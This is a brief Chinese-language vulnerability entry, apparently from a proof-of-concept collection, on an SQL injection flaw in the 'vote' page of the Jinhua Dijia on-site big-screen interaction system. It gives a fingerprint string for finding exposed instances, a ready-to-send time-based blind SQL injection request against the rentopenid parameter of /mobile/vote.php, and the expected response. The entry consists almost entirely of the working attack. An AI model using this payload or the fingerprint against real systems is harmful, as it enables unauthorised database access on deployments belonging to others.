# 金华迪加现场大屏互动系统vote存在SQL注入漏洞

金华迪加现场大屏互动系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/wall/themes/meepo/assets/images/defaultbg.jpg"`
- **请求**：`GET /mobile/vote.php?rentopenid="XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR"Z`
- **响应特征**：200